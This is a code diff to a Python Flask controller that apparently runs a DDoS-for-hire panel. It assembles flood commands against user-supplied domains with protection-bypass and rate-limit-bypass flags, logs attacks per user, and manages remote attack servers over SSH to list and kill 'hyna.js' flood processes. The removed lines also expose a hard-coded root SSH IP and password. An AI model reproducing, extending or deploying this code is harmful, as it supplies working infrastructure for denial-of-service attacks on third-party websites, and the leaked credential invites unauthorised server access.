@@ -20,6 +20,7 @@ from app.services.response import Response
 from app.utils.validate import is_blacklisted, is_whitelisted
 from operator import itemgetter
 from app.services.server_manager import ServerManager
+from app.utils.header import get_header
 
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 private_key_path = os.path.join(BASE_DIR, 'configs', 'private_key.pem')
@@ -46,7 +47,6 @@ class AttackController:
             "mode": "Mode",
             "concurrents": "Concurrents",
             "request": "Request",
-            "spoof": "Spoof",
             "typeAttack": "Type Attack"
         }
 
@@ -66,7 +66,6 @@ class AttackController:
         modeValue = data["mode"]
         concurrentValue = data["concurrents"]
         requestCount = data["request"]
-        spoof = data["spoof"]
         typeAttack = data["typeAttack"]
         death_sword_http = data.get("death_sword_http", "")
         
@@ -83,29 +82,19 @@ class AttackController:
                 user.deactivate()
                 return Response.error("You have exceeded the maximum number of attacks ({MAX_ATTACK_ATTEMPTS}). Your account has been deactivated", code=400)
 
-            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true --ratelimit {bypassRateLimitValue}'
+            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} --debug true --ratelimit {bypassRateLimitValue}'
             
             if typeAttack == 'hyna_valkyra':
                 command = f'{modeValue} {domain} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'
 
-            headers = dict(request.headers)
-            headers.pop('Host', None)
-            headers.pop('Content-Length', None)
-            headers.pop('Content-Type', None)
-            headers.pop('User-Agent', None)
-            headers.pop('Accept', None)
-            headers.pop('Accept-Encoding', None)
-            headers.pop('Connection', None)
-            headers.pop('Authorization', None)
-
             attackLog = AttackLog(
                 userId=currentUser['id'],
-                domainName=domain,  
+                domainName=domain,
                 time=int(attackTimeValue),
                 concurrent=int(concurrentValue),
                 request=int(requestCount),
                 command=command,
-                headers=json.dumps(headers) if headers else None
+                headers=json.dumps(get_header()) if get_header() else None
             )
             db.session.add(attackLog)
             db.session.commit()
@@ -373,12 +362,7 @@ class AttackController:
 
                 return Response.success(ServerManager.server_get_single(server_ip, server_username, server_password))
             else:
-                servers_data = request.args.getlist("servers")
-
-                if not servers_data:
-                    return Response.error(message="Server list cannot be empty", code=400)
-
-                servers_query = Server.query.filter(Server.ip.in_(servers_data)).all()
+                servers_query = Server.query.all()
                 servers = [server.to_dict() for server in servers_query]
 
                 return Response.success(ServerManager.server_get_multi(servers))
@@ -386,39 +370,45 @@ class AttackController:
         except Exception as e:
             return Response.error(message=str(e), code=404)
 
-    def stop_process(self, pid):
+    def stop_process(self, pid=None):
         try:
-            if not isinstance(pid, int) or pid <= 0:
-                return jsonify({"error": "Invalid PID"}), 400
+            currentUser = request.currentUser
 
-            sshClient = paramiko.SSHClient()
-            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            sshClient.connect("23.229.7.14", username="root", password="bsXhIWtZLSRGc5yY")
-            
-            command = f"kill -9 {pid}"
-            sshClient.exec_command(command)
+            if currentUser.get('isAdmin') is False:
+                
+                if not isinstance(pid, int) or pid <= 0:
+                    return Response.error("Invalid PID", code=400)
 
-            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | grep -v 'xvfb'")
-            raw_process_list = stdout.read().decode().strip().split("\n")
+                server_id = currentUser['currentUser']
+                servers_data = Server.query.get(server_id)
 
-            process_list = []
-            for process in raw_process_list:
-                parts = process.split(maxsplit=15)
-                if len(parts) < 11:
-                    continue
+                if not servers_data:
+                    return Response.error("Server not found", 404)
 
-                process_info = {
-                    "origin_data": process,
-                    "domain": parts[12],
-                    "attack_time": parts[8],
-                    "remaining_time": parts[9],
-                    "concurrents": int(parts[14]),
-                    "pid": int(parts[1])
-                }
-                process_list.append(process_info)
+                server_ip = servers_data.to_dict()['ip']
+                server_username = servers_data.to_dict()['username']
+                server_password = servers_data.to_dict()['password']
 
-            sshClient.close()
+                return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))
 
-            return jsonify({"status": "success", "data": process_list}), 200
+            else:
+                if not isinstance(pid, int) or pid <= 0:
+                    servers_query = Server.query.all()
+                    servers = [server.to_dict() for server in servers_query]
+
+                    return Response.success(ServerManager.server_stop_multi(servers))
+                else:
+                    data = request.get_json()
+                    servers_data = Server.query.filter_by(ip=data['server_ip']).first()
+
+                    if not servers_data:
+                        return Response.error("Server not found", 404)
+
+                    server_ip = data['server_ip']
+                    server_username = servers_data.to_dict()['username']
+                    server_password = servers_data.to_dict()['password']
+
+                    return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))
+
         except Exception as e:
-            return jsonify({"status": "error", "message": str(e)}), 400
+            return Response.error(message=str(e), code=404)
